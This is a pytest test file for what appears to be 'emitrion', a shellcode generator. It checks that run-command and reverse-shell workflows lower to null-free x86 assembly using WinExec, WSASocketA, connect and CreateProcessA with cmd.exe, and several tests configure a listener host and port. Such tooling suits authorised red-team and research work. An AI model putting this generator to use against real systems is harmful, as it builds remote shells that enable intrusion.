"""Tests for the x86 workflow backend and end-to-end build integration."""
from __future__ import annotations

import pytest

from emitrion.payload_templates.base import TemplateConfig
from emitrion.workflow.ir import (
    Block,
    Immediate,
    Workflow,
    WriteStructField,
    ZeroStruct,
)
from emitrion.workflow.reference import (
    WorkflowTemplate,
    build_reverse_shell_workflow,
    build_run_command_workflow,
)


class TestRunCommandWorkflow:
    def test_workflow_is_valid(self):
        from emitrion.workflow.validator import validate
        w = build_run_command_workflow()
        result = validate(w)
        assert result.valid, result.errors

    def test_workflow_has_three_blocks(self):
        w = build_run_command_workflow()
        assert len(w.blocks) == 3
        names = {b.name for b in w.blocks}
        assert names == {"entry", "success", "fail"}


class TestWorkflowTemplate:
    def test_probe_slots_finds_apis(self):
        w = build_run_command_workflow()
        tmpl = WorkflowTemplate(w)
        config = TemplateConfig()
        slots = tmpl.probe_slots(config)
        assert "WinExec" in slots
        assert "ExitProcess" in slots

    def test_probe_slots_finds_string(self):
        w = build_run_command_workflow()
        tmpl = WorkflowTemplate(w)
        config = TemplateConfig()
        slots = tmpl.probe_slots(config)
        assert "cmd" in slots

    def test_probe_slots_finds_local(self):
        w = build_run_command_workflow()
        tmpl = WorkflowTemplate(w)
        config = TemplateConfig()
        slots = tmpl.probe_slots(config)
        assert "wexec_result" in slots

    def test_invalid_workflow_raises(self):
        bad = Workflow(
            name="bad",
            blocks=(Block("entry", ()),),
            entry="entry",
        )
        with pytest.raises(ValueError, match="validation failed"):
            WorkflowTemplate(bad)


class TestX86Lowering:
    """Test that the x86 backend produces valid assembly constructs."""

    @pytest.fixture
    def lowered_asm(self, manifest_dir):
        from emitrion.build import build
        result = build(
            str(manifest_dir / "calc.yaml"),
            template_name="ir_run_command",
            out_dir="/dev/null",
            assemble=False,
        )
        return result.asm

    def test_contains_workflow_labels(self, lowered_asm):
        assert "wf_entry:" in lowered_asm
        assert "wf_success:" in lowered_asm
        assert "wf_fail:" in lowered_asm

    def test_contains_winexec_call(self, lowered_asm):
        assert "WinExec" in lowered_asm

    def test_contains_exit_process_call(self, lowered_asm):
        assert "ExitProcess" in lowered_asm

    def test_contains_branch(self, lowered_asm):
        assert "test eax, eax" in lowered_asm
        assert "jnz" in lowered_asm

    def test_contains_hang_loop(self, lowered_asm):
        assert "wf_hang_0:" in lowered_asm
        assert "jmp  wf_hang_0" in lowered_asm

    def test_multiple_terminates_get_unique_labels(self, lowered_asm):
        assert "wf_hang_0:" in lowered_asm
        assert "wf_hang_1:" in lowered_asm
        assert lowered_asm.count("wf_hang_0:") == 1
        assert lowered_asm.count("wf_hang_1:") == 1

    def test_contains_result_store(self, lowered_asm):
        assert "wexec_result" in lowered_asm

    def test_has_framework_stubs(self, lowered_asm):
        assert "call find_module" in lowered_asm
        assert "call resolve_export_by_hash" in lowered_asm

    def test_has_string_section(self, lowered_asm):
        assert "String Construction" in lowered_asm

    def test_no_null_bytes_in_immediates(self, lowered_asm):
        import re
        for match in re.finditer(r'mov\s+\w+,\s+0x([0-9a-f]{8})', lowered_asm):
            hex_val = match.group(1)
            for i in range(0, 8, 2):
                byte_str = hex_val[i:i+2]
                assert byte_str != "00", (
                    f"Null byte in immediate: 0x{hex_val} at position {i}"
                )


class TestEndToEndBuild:
    """Test that the IR workflow builds through the full pipeline."""

    def test_build_no_assemble(self, manifest_dir, tmp_path):
        from emitrion.build import build
        result = build(
            str(manifest_dir / "calc.yaml"),
            template_name="ir_run_command",
            out_dir=str(tmp_path),
            assemble=False,
        )
        assert result.asm
        assert "main:" in result.asm
        assert result.contract_md
        assert result.layout is not None

    def test_build_write_outputs(self, manifest_dir, tmp_path):
        from emitrion.build import build, write_outputs
        result = build(
            str(manifest_dir / "calc.yaml"),
            template_name="ir_run_command",
            out_dir=str(tmp_path),
            assemble=False,
        )
        write_outputs(result, str(tmp_path))
        assert (tmp_path / "asm" / "generated.asm").exists()
        assert (tmp_path / "Documentation" / "contract.md").exists()

    def test_contract_mentions_winexec(self, manifest_dir, tmp_path):
        from emitrion.build import build
        result = build(
            str(manifest_dir / "calc.yaml"),
            template_name="ir_run_command",
            out_dir=str(tmp_path),
            assemble=False,
        )
        assert "WinExec" in result.contract_md

    def test_legacy_build_not_regressed(self, manifest_dir, tmp_path):
        """Verify legacy run_command template still works."""
        from emitrion.build import build
        result = build(
            str(manifest_dir / "calc.yaml"),
            template_name="run_command",
            out_dir=str(tmp_path),
            assemble=False,
        )
        assert result.asm
        assert "WinExec" in result.asm
        assert "main:" in result.asm

    def test_legacy_revshell_not_regressed(self, manifest_dir, tmp_path):
        """Verify legacy reverse_shell template still works."""
        from emitrion.build import build
        result = build(
            str(manifest_dir / "revshell.yaml"),
            template_name="reverse_shell",
            out_dir=str(tmp_path),
            assemble=False,
        )
        assert result.asm
        assert "WSAStartup" in result.asm
        assert "CreateProcessA" in result.asm


class TestStructLowering:
    """Test ZeroStruct and WriteStructField lowering."""

    def test_zero_struct_emits_assembly(self):
        from emitrion.api_database import STRUCT_DATABASE
        from emitrion.stack_alloc import Slot, StackLayout
        from emitrion.workflow.x86_backend import _LoweringContext

        si_size = STRUCT_DATABASE["STARTUPINFOA"].size
        layout = StackLayout([
            Slot(name="STARTUPINFOA", offset=0x80 + si_size, size=si_size, category="structure"),
        ])
        ctx = _LoweringContext(layout, set(), None)
        ctx.struct_types["si"] = "STARTUPINFOA"
        zero_op = ZeroStruct("si")
        lines = ctx._lower_zero_struct(zero_op)
        asm = "\n".join(lines)
        assert "zero si" in asm
        assert "xor  eax, eax" in asm

    def test_write_struct_field_emits_assembly(self):
        from emitrion.api_database import STRUCT_DATABASE
        from emitrion.stack_alloc import Slot, StackLayout
        from emitrion.workflow.x86_backend import _LoweringContext

        si_size = STRUCT_DATABASE["STARTUPINFOA"].size
        layout = StackLayout([
            Slot(name="STARTUPINFOA", offset=0x80 + si_size, size=si_size, category="structure"),
        ])
        ctx = _LoweringContext(layout, set(), None)
        ctx.struct_types["si"] = "STARTUPINFOA"
        field_op = WriteStructField("si", "cb", Immediate(0x44))
        lines = ctx._lower_write_struct_field(field_op)
        asm = "\n".join(lines)
        assert "si.cb" in asm
        # cb starts at the allocated structure base: [ebp-0xc4].
        # This would have been [ebp-0x80] with the former base calculation.
        assert "mov  [ebp-0xc4], eax" in asm

    def test_write_struct_field_uses_base_plus_field_displacement(self):
        """Field offsets are relative to the allocated structure base."""
        from emitrion.api_database import STRUCT_DATABASE
        from emitrion.stack_alloc import Slot, StackLayout
        from emitrion.workflow.x86_backend import _LoweringContext

        si_size = STRUCT_DATABASE["STARTUPINFOA"].size
        layout = StackLayout([
            Slot(name="STARTUPINFOA", offset=0x80 + si_size, size=si_size, category="structure"),
        ])
        ctx = _LoweringContext(layout, set(), None)
        ctx.struct_types["si"] = "STARTUPINFOA"

        asm = "\n".join(
            ctx._lower_write_struct_field(
                WriteStructField("si", "dwFlags", Immediate(0x100))
            )
        )

        # STARTUPINFOA begins at [ebp-0xc4]; dwFlags is 0x2c bytes into it.
        assert "mov  [ebp-0x98], eax" in asm


class TestDeterminism:
    """Identical inputs must produce identical outputs."""

    def test_deterministic_asm(self, manifest_dir, tmp_path, monkeypatch):
        from emitrion.build import build
        monkeypatch.setenv("SOURCE_DATE_EPOCH", "0")
        result1 = build(
            str(manifest_dir / "calc.yaml"),
            template_name="ir_run_command",
            out_dir=str(tmp_path / "a"),
            assemble=False,
        )
        result2 = build(
            str(manifest_dir / "calc.yaml"),
            template_name="ir_run_command",
            out_dir=str(tmp_path / "b"),
            assemble=False,
        )
        assert result1.asm == result2.asm


# ---------------------------------------------------------------------------
# IR Reverse Shell Workflow
# ---------------------------------------------------------------------------


class TestReverseShellWorkflow:
    def test_workflow_is_valid(self):
        from emitrion.workflow.validator import validate
        w = build_reverse_shell_workflow()
        result = validate(w)
        assert result.valid, result.errors

    def test_workflow_has_six_blocks(self):
        w = build_reverse_shell_workflow()
        assert len(w.blocks) == 6
        names = {b.name for b in w.blocks}
        assert names == {
            "entry", "create_socket", "connect_socket",
            "setup_process", "success", "fail",
        }

    def test_workflow_with_custom_params(self):
        from emitrion.workflow.validator import validate
        w = build_reverse_shell_workflow(
            lhost="10.0.0.1", lport=9001, command="powershell.exe",
        )
        result = validate(w)
        assert result.valid, result.errors


class TestReverseShellTemplate:
    def test_probe_slots_finds_apis(self):
        w = build_reverse_shell_workflow()
        tmpl = WorkflowTemplate(w)
        config = TemplateConfig(lhost="127.0.0.1", lport=4444)
        slots = tmpl.probe_slots(config)
        assert "WSAStartup" in slots
        assert "WSASocketA" in slots
        assert "connect" in slots
        assert "CreateProcessA" in slots
        assert "ExitProcess" in slots

    def test_probe_slots_finds_structs(self):
        w = build_reverse_shell_workflow()
        tmpl = WorkflowTemplate(w)
        config = TemplateConfig(lhost="127.0.0.1", lport=4444)
        slots = tmpl.probe_slots(config)
        assert "WSADATA" in slots
        assert "sockaddr_in" in slots
        assert "STARTUPINFOA" in slots
        assert "PROCESS_INFORMATION" in slots

    def test_probe_slots_finds_string(self):
        w = build_reverse_shell_workflow()
        tmpl = WorkflowTemplate(w)
        config = TemplateConfig(lhost="127.0.0.1", lport=4444)
        slots = tmpl.probe_slots(config)
        assert "cmd" in slots

    def test_probe_slots_finds_variables(self):
        w = build_reverse_shell_workflow()
        tmpl = WorkflowTemplate(w)
        config = TemplateConfig(lhost="127.0.0.1", lport=4444)
        slots = tmpl.probe_slots(config)
        assert "socket_handle" in slots
        assert "wsa_ret" in slots
        assert "conn_ret" in slots
        assert "cpa_ret" in slots

    def test_probe_structs(self):
        w = build_reverse_shell_workflow()
        tmpl = WorkflowTemplate(w)
        structs = tmpl.probe_structs()
        assert structs == {
            "wsadata": "WSADATA",
            "sa": "sockaddr_in",
            "si": "STARTUPINFOA",
            "pi": "PROCESS_INFORMATION",
        }

    def test_probe_strings(self):
        w = build_reverse_shell_workflow()
        tmpl = WorkflowTemplate(w)
        strings = tmpl.probe_strings()
        assert strings == {"cmd": "cmd.exe"}


class TestReverseShellLowering:
    """Test that the IR reverse shell lowers to valid assembly."""

    @pytest.fixture
    def revshell_asm(self, manifest_dir):
        from emitrion.build import build
        config = TemplateConfig(lhost="192.168.1.100", lport=9001)
        result = build(
            str(manifest_dir / "revshell.yaml"),
            template_name="ir_reverse_shell",
            config=config,
            out_dir="/dev/null",
            assemble=False,
        )
        return result.asm

    def test_contains_all_block_labels(self, revshell_asm):
        for label in ("wf_entry:", "wf_create_socket:", "wf_connect_socket:",
                       "wf_setup_process:", "wf_success:", "wf_fail:"):
            assert label in revshell_asm, f"Missing label: {label}"

    def test_contains_api_calls(self, revshell_asm):
        for api in ("WSAStartup", "WSASocketA", "connect", "CreateProcessA", "ExitProcess"):
            assert api in revshell_asm, f"Missing API: {api}"

    def test_contains_struct_operations(self, revshell_asm):
        assert "zero sa" in revshell_asm or "zero wsadata" in revshell_asm
        assert "si.cb" in revshell_asm
        assert "si.dwFlags" in revshell_asm
        assert "si.hStdInput" in revshell_asm
        assert "si.hStdOutput" in revshell_asm
        assert "si.hStdError" in revshell_asm

    def test_contains_branching(self, revshell_asm):
        assert "test eax, eax" in revshell_asm or "cmp  eax" in revshell_asm
        assert "jnz" in revshell_asm or "jne" in revshell_asm or "jz" in revshell_asm

    def test_has_framework_stubs(self, revshell_asm):
        assert "call find_module" in revshell_asm
        assert "call resolve_export_by_hash" in revshell_asm

    def test_has_string_section(self, revshell_asm):
        assert "String Construction" in revshell_asm

    def test_no_null_bytes_in_immediates(self, revshell_asm):
        import re
        for match in re.finditer(r'mov\s+\w+,\s+0x([0-9a-f]{8})', revshell_asm):
            hex_val = match.group(1)
            for i in range(0, 8, 2):
                byte_str = hex_val[i:i+2]
                assert byte_str != "00", (
                    f"Null byte in immediate: 0x{hex_val}"
                )


class TestReverseShellEndToEnd:
    """Test that the IR reverse shell builds through the full pipeline."""

    def test_build_no_assemble(self, manifest_dir, tmp_path):
        from emitrion.build import build
        config = TemplateConfig(lhost="192.168.1.100", lport=9001)
        result = build(
            str(manifest_dir / "revshell.yaml"),
            template_name="ir_reverse_shell",
            config=config,
            out_dir=str(tmp_path),
            assemble=False,
        )
        assert result.asm
        assert "main:" in result.asm
        assert result.contract_md
        assert "WSAStartup" in result.contract_md
        assert "CreateProcessA" in result.contract_md

    def test_build_write_outputs(self, manifest_dir, tmp_path):
        from emitrion.build import build, write_outputs
        config = TemplateConfig(lhost="192.168.1.100", lport=9001)
        result = build(
            str(manifest_dir / "revshell.yaml"),
            template_name="ir_reverse_shell",
            config=config,
            out_dir=str(tmp_path),
            assemble=False,
        )
        write_outputs(result, str(tmp_path))
        assert (tmp_path / "asm" / "generated.asm").exists()
        assert (tmp_path / "Documentation" / "contract.md").exists()

    def test_deterministic_asm(self, manifest_dir, tmp_path, monkeypatch):
        from emitrion.build import build
        monkeypatch.setenv("SOURCE_DATE_EPOCH", "0")
        config = TemplateConfig(lhost="192.168.1.100", lport=9001)
        result1 = build(
            str(manifest_dir / "revshell.yaml"),
            template_name="ir_reverse_shell",
            config=config,
            out_dir=str(tmp_path / "a"),
            assemble=False,
        )
        result2 = build(
            str(manifest_dir / "revshell.yaml"),
            template_name="ir_reverse_shell",
            config=config,
            out_dir=str(tmp_path / "b"),
            assemble=False,
        )
        assert result1.asm == result2.asm
